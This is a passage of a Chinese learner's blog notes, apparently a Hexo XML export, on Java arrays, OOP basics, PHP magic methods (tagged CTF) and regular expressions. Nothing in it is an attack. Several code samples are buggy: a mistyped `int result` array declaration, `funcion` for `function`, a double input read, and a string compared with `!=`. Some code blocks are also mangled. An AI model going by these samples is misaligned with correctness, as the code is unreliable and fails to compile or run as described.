punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>array<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="数组作为函数的返回值"><a href="#数组作为函数的返回值" class="headerlink" title="数组作为函数的返回值"></a>数组作为函数的返回值</h4><ol><li>  数组作为函数的返回值，return返回的是一个地址</li><li>  函数的返回值标明数据类型，int[] double[] float[]</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">reverse</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> list<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>list<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>j <span class="token operator">=</span> result<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> list<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">,</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        result<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h4><ol><li><p>数组的数组</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="多维数组的动态初始化基础"><a href="#多维数组的动态初始化基础" class="headerlink" title="多维数组的动态初始化基础"></a>多维数组的动态初始化基础</h4><ol><li><p>直接为每一维度分配空间</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java">type<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> typename <span class="token operator">=</span> <span class="token keyword">new</span> type<span class="token punctuation">[</span>typelength<span class="token punctuation">]</span><span class="token punctuation">[</span>typelength<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>从最高维开始，分别为每一维分配空间</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"Good"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"Luck"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"to"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220811184208.png"></p></li></ol><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Doublearr</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * @param args     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 静态初始化方法1</span>        <span class="token keyword">int</span> c<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 直接将行和宽定义出来的静态初始化</span>        <span class="token comment">// 静态初始化2</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#123;</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">&#123;</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">&#123;</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">// 动态初始化1</span>        <span class="token comment">// 先声明这是一个二维数组，然后再使用new来定义（开辟空间）</span>        <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 先声明这是一个二维数组</span>        a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 再用new去开辟空间</span>        <span class="token comment">// 动态初始化2</span>        <span class="token comment">// 可以出现列数不确定的情况（行数必须确定）</span>        <span class="token comment">// 即数组的第一维必须指出，第二维可以不写</span>        <span class="token keyword">int</span> arr<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 第二维可以不去定义</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 遍历arr的每一个一维数组</span>            <span class="token comment">// 给每个一维数组开空间</span>            <span class="token comment">// 如果没有给一维数组new,那么arr[i]就是null</span>            arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="逆序数组"><a href="#逆序数组" class="headerlink" title="逆序数组"></a>逆序数组</h3><h4 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h4><ol><li><p>  把arr[0]和arr[n-1]进行交换，双指针</p></li><li><p>```<br>  public class Reverse {</p><pre><code>  public static void main(String[] args) &#123;      int[] arr = &#123; 1, 2, 3, 4, 5 &#125;;      int temp = 0;      int len = arr.length;      for(int i = 0;i &lt; arr.length / 2;i++)&#123;          temp = arr[len - 1 - i];          arr[len - 1 - i] = arr[i];          arr[i] = temp;      &#125;      for (int x : arr) &#123;          System.out.print(x);      &#125;  &#125;</code></pre><p>  }</p>  <pre class="line-numbers language-none"><code class="language-none">3.   还有一种是重新开辟内存空间，逆序遍历arr,将每个元素拷贝到arr2的元素中（逆序遍历，顺序拷贝）&#96;&#96;&#96;javapublic class Arrreverse &#123;    public static void main(String[] args) &#123;        int[] arr1 &#x3D; &#123; 1, 2, 3, 4, 5 &#125;;        int[] arr2 &#x3D; new int[arr1.length];        for (int i &#x3D; arr1.length - 1,j &#x3D; 0; i &gt;&#x3D; 0; i--,j++) &#123; &#x2F;&#x2F;注意，当一重循环中有多个循环变量时，只需要定义一次循环变量的类型，例如已经定义了int i,就不能再定义j 为int 了，默认为相同类型            arr2[j] &#x3D; arr1[i];        &#125;        for (int x : arr2) &#123;            System.out.print(x);        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="数组添加1"><a href="#数组添加1" class="headerlink" title="数组添加1"></a>数组添加1</h3><ol><li><p>要求：实现动态地给数组添加元素效果，实现对数组的扩容。</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java">原始的数组使用静态分配 <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>增加元素，直接放在数组的最后 arr_new <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  注意：静态初始化的数组下标的最大值和最小值已经<strong>固定</strong>，如果强制赋值，例如上面的例子，arr[3] = 4,会报<strong>数组越界</strong>的错误，即<strong>静态数组的大小不能改变</strong></p></li><li><p>  思路：定义一个新的数组，int[] arrNew = new int[arr.length + 1]; <strong>令新数组扩容</strong></p></li><li><p>  然后遍历arr数组，依次将arr元素拷贝到arrNew数组</p></li><li><p>  将4赋值给arrNew[arrNew.length - 1];</p></li><li><p>体现是改变的原来的数组，而不是新数组，最后要让arrNew指向原先的arr</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java">arr <span class="token operator">=</span> arrNew<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>原来的没有被引用的空间就会被销毁</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220813121711.png"></p></li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Up</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr_new <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>arr_new<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>arr_new<span class="token punctuation">[</span>arr_new<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token comment">// 让arr 指向arr_new</span>    arr <span class="token operator">=</span> arr_new<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">:</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="数组扩容2"><a href="#数组扩容2" class="headerlink" title="数组扩容2"></a>数组扩容2</h4><ol><li><p>使用户可以动态添加元素进数组</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">1.</span> 创建一个<span class="token class-name">Scanner</span>可以接受用户输入<span class="token number">2.</span> 因为用户什么时候退出，不确定，使用<span class="token keyword">do</span><span class="token operator">-</span><span class="token keyword">while</span> <span class="token operator">+</span> <span class="token keyword">break</span>来控制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>```java<br>  import java.util.Scanner;</p><p>  public class Up {</p><pre><code>  public static void main(String[] args) &#123;      Scanner myscanner = new Scanner(System.in);      int[] arr = &#123; 1, 2, 3 &#125;;      do &#123;          int[] arrNew = new int[arr.length + 1];// 先扩容          for (int i = 0; i &lt; arr.length; i++) &#123; // 再通过遍历，逐个赋值给arrNew              arrNew[i] = arr[i];          &#125;          System.out.println(&quot;请输入你要添加的元素&quot;);          int num = myscanner.nextInt();          arrNew[arrNew.length - 1] = myscanner.nextInt();// 添加最后一个元素          arr = arrNew;          // 询问客户是否还要继续添加          if (num == 1) &#123;              break;          &#125;      &#125; while (true);      for (int x : arr) &#123;          System.out.print(x);      &#125;  &#125;</code></pre><p>  }</p>  <pre class="line-numbers language-none"><code class="language-none">#### 数组缩减&#96;&#96;&#96;javaimport java.util.Scanner;public class Reduce &#123;    public static void main(String[] args)&#123;        int[] arr &#x3D; &#123;1,2,3,4,5&#125;;        Scanner myscanner &#x3D; new Scanner(System.in);        String a;        do&#123;            a &#x3D; myscanner.next();            int[] arrNew &#x3D; new int[arr.length - 1];            for(int i &#x3D; 0;i &lt; arr.length - 1;i ++)&#123;                arrNew[i] &#x3D; arr[i];            &#125;            arr &#x3D; arrNew;        &#125;while(a !&#x3D; &quot;1&quot;); &#x2F;&#x2F;while内部写的是执行循环的条件，是令循环继续下去的条件        for(int x : arr)&#123;            System.out.print(x);        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  和数组扩容的思路相同</p></li></ol><h1 id="acwing补充"><a href="#acwing补充" class="headerlink" title="acwing补充"></a>acwing补充</h1><h2 id="Java和c-，python的不同点"><a href="#Java和c-，python的不同点" class="headerlink" title="Java和c++，python的不同点"></a>Java和c++，python的不同点</h2><ol><li>  java中的函数必须定义到类中</li><li>  c++的函数可以定义到类外面</li></ol><h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><ol><li>  一个方法如果加上了static，那么这个方法就是绑定到了类本身</li><li>  和global类似</li><li>  static的意思是从这个类实例化出来的对象共享属性</li><li>  类方法和类变量</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220829214224.png"></li><li>  静态方法中必须只能调用静态方法和静态属性，不能调用非静态的，即必须加上static</li></ol><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><ol><li>  接口就是用来规范化方法的</li><li>  接口虽然是类，但是不能实例化</li><li>  接口只是对方法进行一个声明，不能具体写实现方法</li><li>  所有implements接口的类必须实现所有接口中的所有方法都实现，接口中的方法都是abstract的，即没有具体写明的</li></ol><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><ol><li>  如果一个游戏有很多英雄</li><li>  英雄有公共（都有）的技能</li><li>  那么其它英雄的技能可以继承自一个基类，这个基类中写共有的方法</li><li>  基类就是父类</li><li>  继承的作用就是为了不去重复写，公共的放到父类中去</li></ol><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><ol><li>  同一个类的同一个函数可能会有不同的行为</li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>魔术方法</title>
      <link href="/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
      <url>/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP魔术方法"><a href="#PHP魔术方法" class="headerlink" title="PHP魔术方法"></a>PHP魔术方法</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol><li>  魔术方法，PHP将所有以两个下划线开头的类方法保留为魔术方法（魔术方法即为一个特殊的类方法）</li><li>  魔术常量，PHP向他运行的任何脚本提供了大量的预定义变量</li></ol><h2 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h2><ol><li><p>  __wakeup()，执行unserialize()时，会先调用这个函数</p></li><li><p>  当在类的外部调用unserialize()时，会先检查在类的内部是否存在一个__wakeup()方法，如果存在，则会先调用__wakeup方法，预先准备对象需要的资源</p></li><li><p>__wakeup()常用于反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> funcion <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h2><ol><li><p>  当对一个对象序列化时，php就会调用__sleep()方法  （如果存在的话）</p></li><li><p>  和__wakeup()相对，一正一反，__sleep是序列化时自动调用，__wakeup是在反序列化时自动调用</p></li><li><p>__sleep方法可以用于清理对象，并且返回一个包含对象中所有变量名称的数组，常用于提交未提交的数据，或类似的清理操作</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> funcion <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'server'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'db'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h2><ol><li><p>  __construct()函数用于创建一个新的simpleXMLelement对象</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220807125426.png"></p></li><li><p>  __construct()：构造方法，在类的实例化的时候，会自动调用该魔术方法，进行类的实例化</p></li><li><p>子类继承父类时__construct()的用法</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span> 自己没有，会自动去父类中找<span class="token number">2.</span> 自己有，自己初始化时会触发自己的__construct方法进行初始化操作<span class="token number">3.</span> 如果有，还想调用父类中的<span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>方法，语法<span class="token punctuation">:</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token constant">__construct</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  __construct和__destruct相对，__construct构建对象的时候被调用，__destruct明确销毁对象或脚本结束时被调用</p></li></ol><h2 id="invoke"><a href="#invoke" class="headerlink" title="invoke()"></a>invoke()</h2><ol><li><p>  当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用，但是如果没有显式地在实例化对象的后面加上参数的话就不会自动调用，类似于<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220807131421.png"></p></li><li><p>即在实例化后的类中直接写参数，即为调用函数的方式调用一个对象</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">abc</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">abc</span><span class="token punctuation">;</span><span class="token variable">$obj</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 即在实例化后的对象中直接加参数，会默认调用类中的__invoke()</span><span class="token comment">/*将会输出int 10*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol><li><p>正则表达式描述了一种字符串匹配的模式，可以用来检查一个字符串是否含有某种子串，将匹配的子串替换或者从某个串中提取符合某个条件的子串。</p>  <pre class="line-numbers language-none"><code class="language-none">runoo+b 可以匹配runoob runooob runoooob等，+号代表前面的字符必须至少出现一次runoo*b 可以匹配runob runoob runoooob等，*号代表前面的字符可以不出现，也可以出现一次或多次colou?r  可以匹配color或者colour，？问号代表前面的字符最多只可以出现一次<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  构造正则表达式的方法和创建数学表达式的方法一样。也就是用多种元字符与运算符可以将小的表达式结合在一起来创建更大的表达式。正则表达式的组件可以是单个的字符、字符集合、字符范围、字符间的选择或者所有这些组件的任意组合。</p></li><li><p>  正则表达式是由普通字符（例如字符 a 到 z）以及特殊字符（称为”元字符”）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。</p></li></ol><h2 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h2><ol><li><p>  普通字符包括没有显式指定为元字符的所有可打印和不可打印字符，这包括所有大小写字母，所有数字，所有标点符号，和一些其它符号</p></li><li><p>[…] 将会匹配[]中括号中的所有字符</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805160900.png"></p></li><li><p>[^…] 带个^,将会匹配除了[…]括号中的所有字符</p><p>  <img 